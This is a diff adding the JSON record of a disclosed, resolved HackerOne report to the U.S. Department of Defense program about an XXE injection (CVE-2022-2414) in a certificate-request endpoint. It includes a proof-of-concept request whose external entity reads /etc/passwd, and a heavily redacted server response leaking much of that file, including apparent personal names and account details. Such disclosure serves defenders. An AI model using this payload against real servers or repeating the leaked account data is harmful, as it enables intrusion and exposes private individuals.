@@ -1,0 +1,114 @@
+{
+  "id": 2564265,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTY0MjY1",
+  "url": "https://hackerone.com/reports/2564265",
+  "title": "XML E██████ternal Entity (XXE) Injection in ███",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-06-20T01:33:27.686Z",
+  "submitted_at": "2024-06-20T01:33:27.763Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "maskedpersian",
+    "url": "/maskedpersian",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ykh4v12r4cygxt6ovv6bjr3c6viu/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-2414"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-12T19:33:43.605Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-07-23T08:21:22.522Z",
+  "team_member_agreed_on_going_public_at": "2026-01-12T19:33:43.427Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\nCVE-2022-2414 describes an XML E██████ternal Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an e██████████ternal entity. When the XML parser is improperly configured to process e███████ternal entities, it can allow an attacker to███████\nRead arbitrary files on the server.\nPerform server-side request forgery (SSRF).\nConduct denial-of-service (DoS) attacks.\nE█████████ecute remote code (in rare cases).\n\nHost name█████ ██████████\n\n\nPOC████████\nrequest█████████\n```\nPOST /ca/rest/certrequests HTTP/1.1\nHost███ ██████████\nSec-Ch-Ua███████ \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\nSec-Ch-Ua-Mobile██████████ ?0\nSec-Ch-Ua-Platform█████ \"Windows\"\nUpgrade-Insecure-Requests███████ 1\nUser-Agent█████████ Mozilla/5.0 (Windows NT 10.0; Win64; ██████████64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\nAccept██████ te█████t/html,application/██████████html+████ml,application/████████ml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-e██████████change;v=b3;q=0.7\nSec-Fetch-Site████ same-origin\nSec-Fetch-Mode██████ navigate\nSec-Fetch-Dest███████ frame\nReferer█████ █████████\nAccept-Encoding████████ gzip, deflate\nAccept-Language███████ en-US,en;q=0.9,fa;q=0.8\nPriority██████ u=0, i\nConnection█████ close\nContent-Type██████ application/██████████ml\nContent-Length████████ 194\n\n<!--?████████ml version=\"2.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file████████///etc/passwd\"> ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n</CertEnrollmentRequest>\n```\nresponde████\n```\nHTTP/1.1 400 Bad Request\nDate███████ ██████ █████ GMT\nServer████ Apache\nContent-Type███████ application/████ml\nContent-Length█████ 4920\nConnection██████████ close\n\n<?████████ml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><PKIE█████ception><Attributes/><ClassName>com.netscape.certsrv.base.BadRequestE███ception</ClassName><Code>400</Code><Message>Profile root███████████████0█████0█████████root███/root██████/bin/bash\\nbin█████████████1██████1███████bin██████████/bin███████/sbin/nologin\\ndaemon█████████2████████2████████daemon█████/sbin████████/sbin/nologin\\nadm████████████████3█████████4███████adm█████/var/adm██████████/sbin/nologin\\nmail█████████████████████████mail██████████/var/spool/mail████████/sbin/nologin\\noperator███████████████11███████0████████operator████/root████/sbin/nologin\\nnobody██████████████Nobody████/█████/sbin/nologin\\navahi-autoipd█████████████████████████████Avahi IPv4LL Stack████████/var/lib/avahi-autoipd█████████/sbin/nologin\\ndbus████████████System message bus█████████/██████/sbin/nologin\\nabrt██████████████etc/abrt███/sbin/nologin\\n█████████████████████9██████8██████████User for ██████████/█████/sbin/nologin\\nunbound█████████████████998██████997████████Unbound DNS resolver█████████/etc/unbound███████/sbin/nologin\\nlibstoragemgmt█████████997███████996██████████daemon account for libstoragemgmt█████████/var/run/lsm█████████/sbin/nologin\\ntss█████████████████████████Account used by the trousers package to sandbo██████ the tcsd daemon███████/dev/null█████████/sbin/nologin\\nntp████etc/ntp█████████/sbin/nologin\\npostfi███████████████████var/spool/postfi████████████████/sbin/nologin\\nsshd███████████74██████████74███Privilege-separated SSH████████/var/empty/sshd█████████/sbin/nologin\\nchrony█████████████var/lib/chrony█████/sbin/nologin\\nsystemd-bus-pro█████y████████████████████████systemd Bus Pro████y████████/█████████/sbin/nologin\\nsystemd-network██████████████████████████████systemd Network Management█████████/████/sbin/nologin\\nrpc███████████████Rpcbind Daemon████/var/lib/rpcbind██████████/sbin/nologin\\npuppet████████████████████████████Puppet█████████/var/lib/puppet█████████/sbin/nologin\\nnagios█████home/nagios████████/bin/bash\\n█████████████home/████████████████/sbin/nologin\\█████████home/██████████████/sbin/nologin\\n████████████home/██████████/sbin/nologin\\████home/███████████████/sbin/nologin\\██████████████████████████home/███████████/sbin/nologin\\██████████████home/█████████████████/sbin/nologin\\nsssd███████████████████████████████990███████User for sssd████████/██████████/sbin/nologin\\n█████████████████████PIZZULLO.JOSEPH.T.1264435060██████/home/████████████████/bin/bash\\n█████████████████████home/█████████/sbin/nologin\\nwstark█████home/wstark███████/sbin/nologin\\newinters████████████████████/home/ewinters██████████/sbin/nologin\\n███████████████████████/home/████████████/sbin/nologin\\n████████████home/█████████████████/sbin/nologin\\n███████████████████████████████ACAS Scanner██████/home/█████████/bin/bash\\n███████████████████████████████████SANCHEZ.DIANA.L.1040930155█████████/home/███████████████████/bin/bash\\nnfast████████████992███████989███████nfast driver service account████████/opt/nfast████/bin/bash\\napache███████████████████████Apache██████/usr/share/httpd█████/sbin/nologin\\nhsqldb████var/lib/hsqldb█████/sbin/nologin\\ntomcat████████Apache Tomcat███/usr/share/tomcat██████████/bin/nologin\\n████████████████████████████████████Certificate System█████/usr/share/███████/sbin/nologin\\n█████████████████home/█████████████/sbin/nologin\\n█████████████████████████home/████████████/sbin/nologin\\n██████████-sw-█████████████████████████████████████████PKI user account for instance sw-ca-54████/home/███████-sw-ca-54████████/sbin/nologin\\n█████-sw-ca-56█████████PKI user account for instance sw-ca-56████/home/█████████-sw-ca-56███████/sbin/nologin\\n███-sw-██████████PKI user account for instance sw-ca-58█████/home/█████████-sw-ca-58██████████/sbin/nologin\\n███████████████ALEXANDER.BRYAN.DOUGLAS.1165971600█████/home/██████████████████/bin/bash\\n████████████████████████home/████████████████/sbin/nologin\\n███████████████████████home/█████████████████/sbin/nologin\\n████████████████home/████████████████/sbin/nologin\\nrlamotte██████████home/rlamotte█████████/sbin/nologin\\ngdunn███home/gdunn████████/sbin/nologin\\n█████████████████home/█████████████/sbin/nologin\\n█████████tech█████████home/███tech████/bin/bash\\ninsights██████████████████████████Red Hat Insights█████████/var/lib/insights█████████/sbin/nologin\\nafederico████home/afederico████/sbin/nologin\\n███████████████home/██████████████/sbin/nologin\\n██████████████████████████████/home/█████████████/sbin/nologin\\n█████████-email-██████████'Certificate System'████████/usr/share/█████████████████/sbin/nologin\\n█████████-id-███████████████'Certificate System'███████/usr/share/████████████████/sbin/nologin\\n███-sw-█████████████'Certificate System'████████/usr/share/██████████/sbin/nologin\\n█████████-sw-█████████████████'Certificate System'██████████/usr/share/████████████████/sbin/nologin\\naes██████████████1043███1043███████Account used to host DTM OCSP certificates█████████/home/aes████████/bin/bash\\nredhat██████████1044█████1044███████Account used to run AES webserver████/home/redhat████/bin/bash\\nmagency█████████████████1045██████████1045█████████Service Account███/home/magency██████/bin/bash\\n███████████████████████████████████████████/home/████████████████/sbin/nologin\\n████████████████████████████████████/home/████████████/sbin/nologin\\n██████████████████████████████████████████/home/███████████████/sbin/nologin\\n████████████████████████████████████/home/█████████████/sbin/nologin\\n█████████████████████████████████████████MULLIN.TIMOTHY.HUGH.1180218110█████/home/█████████████████/bin/bash\\n████████████████████████████████████████████/home/███████/sbin/nologin\\n██████████████████████████████████████NOVACK.BARRY.FRANCISE.1027795079██████████/home/█████████████/bin/bash\\n███████████████████████████████████POWELL.JAY.A.1162634875█████/home/███████████/bin/bash\\n█████████████████████████████████DOWNUM.ALEXANDER.JEFFERY.1257465523████████/home/█████████/bin/bash\\nncsnmpd███████████1055████1055████nCipher crypto management█████████/opt/nfast█████/bin/bash\\n█████████████████SUBIA.JOSE.A.1264627598█████/home/██████████████/bin/bash\\n█████████████12345████████████████/home/██████████████/bin/false\\n Not Found</Message></PKIE████████ception>\n```\n\n## Impact\n\nE███████ploitation of this vulnerability can lead to████████\n1-Confidentiality Breach██████████ Unauthorized access to sensitive information stored on the server.\n2-Integrity Violation██████████ Potential manipulation or corruption of application data.\n3-Availability Disruption██████ Possible denial-of-service conditions due to resource e█████████haustion or application crashes.\n4-Remote Code E████ecution█████ In e██████████treme cases, e███████ecution of arbitrary commands on the server.\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\npoc\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 54,
+    "name": "XML External Entities (XXE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "m4khn0",
+    "maskedpersian",
+    "mohaned0101",
+    "sisi0x",
+    "redhatyyy",
+    "maskedpersia"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
